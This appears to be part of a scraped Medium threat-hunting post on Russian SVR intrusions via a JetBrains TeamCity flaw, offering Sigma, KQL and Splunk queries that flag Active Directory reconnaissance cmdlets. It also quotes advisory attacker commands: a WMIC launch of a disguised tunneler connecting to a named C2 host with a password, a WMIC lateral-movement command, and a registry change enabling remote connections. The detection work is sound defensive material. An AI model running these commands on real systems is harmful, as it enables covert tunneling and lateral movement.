Directory","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*EWt3AdiycW609A2CPEDI2A.png":{"__typename":"ImageMetadata","id":"1*EWt3AdiycW609A2CPEDI2A.png","originalHeight":149,"originalWidth":209,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:f69d26ea209e_91":{"__typename":"Paragraph","id":"f69d26ea209e_91","name":"f02d","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*EWt3AdiycW609A2CPEDI2A.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_92":{"__typename":"Paragraph","id":"f69d26ea209e_92","name":"382d","type":"P","href":null,"layout":null,"metadata":null,"text":"Commands like above are used by threat actors when they try to get further information about the Active Directory to move laterally. Further commands could be found here LOLAD.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":169,"end":175,"href":"https:\u002F\u002Flolad-project.github.io\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_93":{"__typename":"Paragraph","id":"f69d26ea209e_93","name":"e933","type":"BQ","href":null,"layout":null,"metadata":null,"text":"The LOLAD and Exploitation project provides a comprehensive collection of Active Directory techniques, commands, and functions that can be used natively to support offensive security operations and Red Team exercises. These techniques leverage AD’s built-in tools to conduct reconnaissance, privilege escalation, and lateral movement, among other tactics. Understanding these methods helps defenders strengthen AD configurations and improve monitoring capabilities.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":4,"end":26,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_94":{"__typename":"Paragraph","id":"f69d26ea209e_94","name":"2147","type":"P","href":null,"layout":null,"metadata":null,"text":"I’ve written for all commands a Sigma Rule for threat hunting.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_95":{"__typename":"Paragraph","id":"f69d26ea209e_95","name":"8e4e","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FLiving Off The Land and Exploitation Active Directory.yml at Russian-Threat-Actor ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":221,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FLiving%20Off%20The%20Land%20and%20Exploitation%20Active%20Directory.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":96,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":97,"end":211,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002FRussian-Threat-Actor\u002FLiving%20Off%20The%20Land%20and%20Exploitation%20Active%20Directory.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*qUHYjKojp3xCKVXt"}},"Paragraph:f69d26ea209e_96":{"__typename":"Paragraph","id":"f69d26ea209e_96","name":"f653","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE KQL:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_97":{"__typename":"Paragraph","id":"f69d26ea209e_97","name":"7708","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where (((FolderPath endswith @’\\powershell.exe’ or FolderPath endswith @’\\pwsh.exe’ or FolderPath endswith @’\\powershell_ise.exe’) or ProcessVersionInfoOriginalFileName in~ (@’PowerShell.EXE’, @’pwsh.dll’)) and (ProcessCommandLine contains @’Get-AD ‘ or ProcessCommandLine contains @’Get-GPO’ or ProcessCommandLine contains @’Search-ADAccount’ or ProcessCommandLine contains @’Get-NetGroup’ or ProcessCommandLine contains @’Get-NetDomain’ or ProcessCommandLine contains @’Get-NetDomainTrust’ or ProcessCommandLine contains @’Get-LocalGroupMember’ or ProcessCommandLine contains @’Get-NetUser’ or ProcessCommandLine contains @’Get-DomainPolicy’ or ProcessCommandLine contains @’Get-NetSession’ or ProcessCommandLine contains @’Get-DnsServer’ or ProcessCommandLine contains @’Get-ADReplicationSubnet’ or ProcessCommandLine contains @’Get-EventLog’ or ProcessCommandLine contains @’Clear-EventLog’ or ProcessCommandLine contains @’Backup-GPO’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_98":{"__typename":"Paragraph","id":"f69d26ea209e_98","name":"d99d","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_99":{"__typename":"Paragraph","id":"f69d26ea209e_99","name":"6437","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:Microsoft-Windows-Sysmon\u002FOperational” AND (((NewProcessName=”*\\\\powershell.exe” OR NewProcessName=”*\\\\pwsh.exe” OR NewProcessName=”*\\\\powershell_ise.exe”) OR (OriginalFileName=”PowerShell.EXE” OR OriginalFileName=”pwsh.dll”)) AND (CommandLine=”*Get-AD *” OR CommandLine=”*Get-GPO*” OR CommandLine=”*Search-ADAccount*” OR CommandLine=”*Get-NetGroup*” OR CommandLine=”*Get-NetDomain*” OR CommandLine=”*Get-NetDomainTrust*” OR CommandLine=”*Get-LocalGroupMember*” OR CommandLine=”*Get-NetUser*” OR CommandLine=”*Get-DomainPolicy*” OR CommandLine=”*Get-NetSession*” OR CommandLine=”*Get-DnsServer*” OR CommandLine=”*Get-ADReplicationSubnet*” OR CommandLine=”*Get-EventLog*” OR CommandLine=”*Clear-EventLog*” OR CommandLine=”*Backup-GPO*”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_100":{"__typename":"Paragraph","id":"f69d26ea209e_100","name":"ee00","type":"H4","href":null,"layout":null,"metadata":null,"text":"Tunneling into Compromised Environments","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_101":{"__typename":"Paragraph","id":"f69d26ea209e_101","name":"2c00","type":"BQ","href":null,"layout":null,"metadata":null,"text":"In selected environments the SVR used an additional tool named, “rr.exe” — a modified open source reverse socks tunneler named Rsockstun — to establish a tunnel to the C2 infrastructure [T1572]. The authoring agencies are aware of the following infrastructure used in conjunction with “rr.exe”: ","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":65,"end":71,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":286,"end":292,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_102":{"__typename":"Paragraph","id":"f69d26ea209e_102","name":"93d9","type":"PRE","href":null,"layout":null,"metadata":null,"text":" 65.20.97[.]203:443  ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_103":{"__typename":"Paragraph","id":"f69d26ea209e_103","name":"8497","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Poetpages[.]com:8443 ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_104":{"__typename":"Paragraph","id":"f69d26ea209e_104","name":"3908","type":"BQ","href":null,"layout":null,"metadata":null,"text":"The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation Command Line (WMIC) [T1047] utility after dropping it to disk: ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_105":{"__typename":"Paragraph","id":"f69d26ea209e_105","name":"a534","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic process call create “C:\\Program Files\\Windows Defender Advanced Threat Protection\\Sense.exe -connect poetpages.com -pass M554–0sddsf2@34232fsl45t31” ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_106":{"__typename":"Paragraph","id":"f69d26ea209e_106","name":"9067","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Lateral Movement The SVR used WMIC to facilitate lateral movement [T1047],[T1210]. ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_107":{"__typename":"Paragraph","id":"f69d26ea209e_107","name":"c3f6","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic \u002Fnode:”””” \u002Fuser:””” \u002Fpassword:”””” process call create “”rundll32 C:\\Windows\\system32\\AclNumsInvertHost.dll AclNumsInvertHost”” ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_108":{"__typename":"Paragraph","id":"f69d26ea209e_108","name":"e103","type":"BQ","href":null,"layout":null,"metadata":null,"text":"The SVR also modified DisableRestrictedAdmin key to enable remote connections [T1210]. It modified Registry using the following reg command: ","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:f69d26ea209e_109":{"__typename":"Paragraph","id":"f69d26ea209e_109","name":"34b3","type":"PRE","href":null,"layout":null,"metadata":null,"text":"reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa \u002Fv DisableRestrictedAdmin \u002Ft REG_DWORD \u002Fd “0” \u002Ff","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"UserViewerEdge:userId:3d60ce83d2f7-viewerId:lo_13f2cb9b2f93":{"__typename":"UserViewerEdge","id":"userId:3d60ce83d2f7-viewerId:lo_13f2cb9b2f93","isMuting":false},"ImageMetadata:":{"__typename":"ImageMetadata","id":"","alt":null,"focusPercentX":null,"focusPercentY":null,"originalHeight":null,"originalWidth":null},"PostViewerEdge:postId:1b40810f8552-viewerId:lo_13f2cb9b2f93":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:1b40810f8552-viewerId:lo_13f2cb9b2f93"},"Tag:cybersecurity":{"__typename":"Tag","id":"cybersecurity","displayTitle":"Cybersecurity","normalizedTagSlug":"cybersecurity"},"Tag:threat-detection":{"__typename":"Tag","id":"threat-detection","displayTitle":"Threat Detection","normalizedTagSlug":"threat-detection"},"Tag:threat-hunting":{"__typename":"Tag","id":"threat-hunting","displayTitle":"Threat Hunting","normalizedTagSlug":"threat-hunting"},"Tag:information-security":{"__typename":"Tag","id":"information-security","displayTitle":"Information Security","normalizedTagSlug":"information-security"},"Tag:detection-engineering":{"__typename":"Tag","id":"detection-engineering","displayTitle":"Detection Engineering","normalizedTagSlug":"detection-engineering"},"Post:1b40810f8552":{"__typename":"Post","id":"1b40810f8552","collection":null,"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"836c","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:f69d26ea209e_0"},{"__ref":"Paragraph:f69d26ea209e_1"},{"__ref":"Paragraph:f69d26ea209e_2"},{"__ref":"Paragraph:f69d26ea209e_3"},{"__ref":"Paragraph:f69d26ea209e_4"},{"__ref":"Paragraph:f69d26ea209e_5"},{"__ref":"Paragraph:f69d26ea209e_6"},{"__ref":"Paragraph:f69d26ea209e_7"},{"__ref":"Paragraph:f69d26ea209e_8"},{"__ref":"Paragraph:f69d26ea209e_9"},{"__ref":"Paragraph:f69d26ea209e_10"},{"__ref":"Paragraph:f69d26ea209e_11"},{"__ref":"Paragraph:f69d26ea209e_12"},{"__ref":"Paragraph:f69d26ea209e_13"},{"__ref":"Paragraph:f69d26ea209e_14"},{"__ref":"Paragraph:f69d26ea209e_15"},{"__ref":"Paragraph:f69d26ea209e_16"},{"__ref":"Paragraph:f69d26ea209e_17"},{"__ref":"Paragraph:f69d26ea209e_18"},{"__ref":"Paragraph:f69d26ea209e_19"},{"__ref":"Paragraph:f69d26ea209e_20"},{"__ref":"Paragraph:f69d26ea209e_21"},{"__ref":"Paragraph:f69d26ea209e_22"},{"__ref":"Paragraph:f69d26ea209e_23"},{"__ref":"Paragraph:f69d26ea209e_24"},{"__ref":"Paragraph:f69d26ea209e_25"},{"__ref":"Paragraph:f69d26ea209e_26"},{"__ref":"Paragraph:f69d26ea209e_27"},{"__ref":"Paragraph:f69d26ea209e_28"},{"__ref":"Paragraph:f69d26ea209e_29"},{"__ref":"Paragraph:f69d26ea209e_30"},{"__ref":"Paragraph:f69d26ea209e_31"},{"__ref":"Paragraph:f69d26ea209e_32"},{"__ref":"Paragraph:f69d26ea209e_33"},{"__ref":"Paragraph:f69d26ea209e_34"},{"__ref":"Paragraph:f69d26ea209e_35"},{"__ref":"Paragraph:f69d26ea209e_36"},{"__ref":"Paragraph:f69d26ea209e_37"},{"__ref":"Paragraph:f69d26ea209e_38"},{"__ref":"Paragraph:f69d26ea209e_39"},{"__ref":"Paragraph:f69d26ea209e_40"},{"__ref":"Paragraph:f69d26ea209e_41"},{"__ref":"Paragraph:f69d26ea209e_42"},{"__ref":"Paragraph:f69d26ea209e_43"},{"__ref":"Paragraph:f69d26ea209e_44"},{"__ref":"Paragraph:f69d26ea209e_45"},{"__ref":"Paragraph:f69d26ea209e_46"},{"__ref":"Paragraph:f69d26ea209e_47"},{"__ref":"Paragraph:f69d26ea209e_48"},{"__ref":"Paragraph:f69d26ea209e_49"},{"__ref":"Paragraph:f69d26ea209e_50"},{"__ref":"Paragraph:f69d26ea209e_51"},{"__ref":"Paragraph:f69d26ea209e_52"},{"__ref":"Paragraph:f69d26ea209e_53"},{"__ref":"Paragraph:f69d26ea209e_54"},{"__ref":"Paragraph:f69d26ea209e_55"},{"__ref":"Paragraph:f69d26ea209e_56"},{"__ref":"Paragraph:f69d26ea209e_57"},{"__ref":"Paragraph:f69d26ea209e_58"},{"__ref":"Paragraph:f69d26ea209e_59"},{"__ref":"Paragraph:f69d26ea209e_60"},{"__ref":"Paragraph:f69d26ea209e_61"},{"__ref":"Paragraph:f69d26ea209e_62"},{"__ref":"Paragraph:f69d26ea209e_63"},{"__ref":"Paragraph:f69d26ea209e_64"},{"__ref":"Paragraph:f69d26ea209e_65"},{"__ref":"Paragraph:f69d26ea209e_66"},{"__ref":"Paragraph:f69d26ea209e_67"},{"__ref":"Paragraph:f69d26ea209e_68"},{"__ref":"Paragraph:f69d26ea209e_69"},{"__ref":"Paragraph:f69d26ea209e_70"},{"__ref":"Paragraph:f69d26ea209e_71"},{"__ref":"Paragraph:f69d26ea209e_72"},{"__ref":"Paragraph:f69d26ea209e_73"},{"__ref":"Paragraph:f69d26ea209e_74"},{"__ref":"Paragraph:f69d26ea209e_75"},{"__ref":"Paragraph:f69d26ea209e_76"},{"__ref":"Paragraph:f69d26ea209e_77"},{"__ref":"Paragraph:f69d26ea209e_78"},{"__ref":"Paragraph:f69d26ea209e_79"},{"__ref":"Paragraph:f69d26ea209e_80"},{"__ref":"Paragraph:f69d26ea209e_81"},{"__ref":"Paragraph:f69d26ea209e_82"},{"__ref":"Paragraph:f69d26ea209e_83"},{"__ref":"Paragraph:f69d26ea209e_84"},{"__ref":"Paragraph:f69d26ea209e_85"},{"__ref":"Paragraph:f69d26ea209e_86"},{"__ref":"Paragraph:f69d26ea209e_87"},{"__ref":"Paragraph:f69d26ea209e_88"},{"__ref":"Paragraph:f69d26ea209e_89"},{"__ref":"Paragraph:f69d26ea209e_90"},{"__ref":"Paragraph:f69d26ea209e_91"},{"__ref":"Paragraph:f69d26ea209e_92"},{"__ref":"Paragraph:f69d26ea209e_93"},{"__ref":"Paragraph:f69d26ea209e_94"},{"__ref":"Paragraph:f69d26ea209e_95"},{"__ref":"Paragraph:f69d26ea209e_96"},{"__ref":"Paragraph:f69d26ea209e_97"},{"__ref":"Paragraph:f69d26ea209e_98"},{"__ref":"Paragraph:f69d26ea209e_99"},{"__ref":"Paragraph:f69d26ea209e_100"},{"__ref":"Paragraph:f69d26ea209e_101"},{"__ref":"Paragraph:f69d26ea209e_102"},{"__ref":"Paragraph:f69d26ea209e_103"},{"__ref":"Paragraph:f69d26ea209e_104"},{"__ref":"Paragraph:f69d26ea209e_105"},{"__ref":"Paragraph:f69d26ea209e_106"},{"__ref":"Paragraph:f69d26ea209e_107"},{"__ref":"Paragraph:f69d26ea209e_108"},{"__ref":"Paragraph:f69d26ea209e_109"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:3d60ce83d2f7"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fmedium.com\u002F@simone.kraus\u002Fhunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"cybersecurity"},{"__typename":"Topic","slug":"programming"}],"isPublished":true,"latestPublishedVersion":"f69d26ea209e","visibility":"PUBLIC","postResponses":{"__typename":"PostResponses","count":0},"clapCount":3,"allowResponses":true,"isLimitedState":false,"title":"Hunting SVR — Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally","isSeries":false,"sequence":null,"uniqueSlug":"hunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1735928372176,"readingTime":8.252830188679244,"previewContent":{"__typename":"PreviewContent","subtitle":"Behavior Patterns"},"previewImage":{"__ref":"ImageMetadata:"},"isShortform":false,"seoTitle":"","firstPublishedAt":1735775190287,"updatedAt":1735928372176,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","viewerEdge":{"__ref":"PostViewerEdge:postId:1b40810f8552-viewerId:lo_13f2cb9b2f93"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:cybersecurity"},{"__ref":"Tag:threat-detection"},{"__ref":"Tag:threat-hunting"},{"__ref":"Tag:information-security"},{"__ref":"Tag:detection-engineering"}],"isNewsletter":false,"statusForCollection":null,"pendingCollection":null,"detectedLanguage":"en","wordCount":2134,"layerCake":0,"responsesLocked":false}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"HIT"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.48bdf878.js"></script><script src="https://cdn-client.medium.com/lite/static/js/9865.1496d74a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.872afbe3.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.d9108df7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4810.6318add7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2707.a4e221ac.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.933c1c9a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8599.73cb8339.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5250.9f9e01d2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9898.d9e26c5e.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2648.26563adf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8393.826a25fb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4863.28ab43f6.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6589.247b1d02.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5642.0f82ef97.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6546.cd03f950.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.8aa8d357.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2420.2a5e2d95.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/839.1c286b32.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.60bcefe8.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2106.0350840b.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7394.73a57633.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5794.9e8ff5dd.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8204.7749bc66.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4391.59acaed3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.2dc8b1c6.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8414.6565ad5f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3974.8d3e0217.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2527.d5e0c2f5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostResponsesContent.7ad7ca92.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/responses.editor.5a11f4da.chunk.js"></script><script>window.main();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8fca6a715cd8cadc',t:'MTczNTk4NTE4NS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8fca6a715cd8cadc","version":"2024.10.5","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"0b5f665943484354a59c39c6833f7078","b":1}' crossorigin="anonymous"></script>
</body></html>